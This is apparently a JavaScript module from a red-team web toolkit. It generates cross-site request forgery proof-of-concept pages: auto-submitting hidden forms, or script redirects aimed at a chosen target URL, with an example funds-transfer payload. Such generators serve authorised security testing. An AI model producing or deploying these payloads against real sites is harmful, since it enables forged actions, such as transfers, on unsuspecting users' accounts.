
// ========================================
// CSRF POC GENERATOR
// Category: Red Team
// ========================================

(function() {
    'use strict';

    function render() {
        return `

                        <div class="section-header">
                <h3 class="mb-1 d-flex align-items-center gap-2">
                    <i class="bi bi-shield-lock"></i>
                    <span>CSRF PoC Generator</span>
                </h3>
                <p class="text-secondary mb-0">
                    Build a minimal HTML PoC to demonstrate Cross-Site Request Forgery.
                </p>
            </div>
            
            <div class="card">
                <div class="card-body">
                    <div class="row g-3">
                        <div class="col-md-6">
                            <label for="csrfUrl" class="form-label">Target URL <span class="text-success">*</span></label>
                            <input type="url" id="csrfUrl" class="form-control" placeholder="https://target.example.com/transfer">
                        </div>
                        <div class="col-md-3">
                            <label for="csrfMethod" class="form-label">Method</label>
                            <select id="csrfMethod" class="form-select">
                                <option value="GET">GET</option>
                                <option value="POST" selected>POST</option>
                            </select>
                        </div>
                        <div class="col-12">
                            <label for="csrfParams" class="form-label">Parameters (JSON) <span class="text-success">*</span></label>
                            <textarea id="csrfParams" class="form-control font-monospace" rows="5" placeholder='{"amount": "1000", "to": "attacker"}'></textarea>
                        </div>
                    </div>
                    
                    <div class="mt-3 d-flex gap-2">
                        <button class="btn btn-primary" onclick="generateCsrfPoc()">
                            <i class="bi bi-play-fill"></i> Generate PoC
                        </button>
                    </div>
                    
                    <div id="csrfResults" class="mt-3"></div>
                </div>
            </div>
        `;
    }

        function init() {
        window.generateCsrfPoc = function() {
    const url = document.getElementById('csrfUrl').value;
    const method = document.getElementById('csrfMethod').value;
    const paramsText = document.getElementById('csrfParams').value;
    const resultsDiv = document.getElementById('csrfResults');
    
    if (!url) {
        resultsDiv.innerHTML = `<div class="alert alert-danger" role="alert">Enter a URL.</div>`;
        return;
    }

    let params = {};
    try {
        params = paramsText ? JSON.parse(paramsText) : {};
    } catch (e) {
        resultsDiv.innerHTML = '<div class="alert alert-danger" role="alert">Invalid JSON format</div>';
        return;
    }

    let poc = '';
    
    if (method === 'POST') {
        const formFields = Object.entries(params)
            .map(([key, value]) => `        <input type="hidden" name="${key}" value="${value}">`)
            .join('\n');
        
        poc = `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF PoC - Auto-submitting</h1>
    <form id="csrfForm" action="${url}" method="POST">
${formFields}
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`;
    } else {
        const queryString = Object.entries(params)
            .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
            .join('&');
        
        poc = `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF PoC - Auto-redirecting</h1>
    <script>
        window.location = "${url}?${queryString}";
    </script>
</body>
</html>`;
    }

    // Create a clean download button without complex escaping
    const downloadButtonId = 'download-csrf-' + Date.now();
    
    resultsDiv.innerHTML = `
        <div class="alert alert-success" role="alert">
            <strong>PoC generated.</strong> Save as <code>.html</code> and open in a browser.
        </div>
        <div class="card">
            <div class="card-header">HTML PoC</div>
            <div class="card-body">
                <pre class="bg-dark text-light p-3 rounded small mb-3">${window.escapeHtml(poc)}</pre>
                <button id="${downloadButtonId}" class="btn btn-outline-secondary">
                    <i class="bi bi-download"></i> Download
                </button>
            </div>
        </div>
    `;

    // Add event listener separately to avoid escaping issues
    document.getElementById(downloadButtonId).addEventListener('click', function() {
        // Use Blob method for download to avoid escaping issues
        const blob = new Blob([poc], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'csrf-poc.html';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    });
};
    }

    window.registerCyberSuiteTool({
        id: 'csrf-poc',
        name: 'CSRF PoC Generator',
        description: 'Generate CSRF proof-of-concept',
        icon: 'bi-shield-lock',
        category: 'red',
        render: render,
        init: init
    });
})();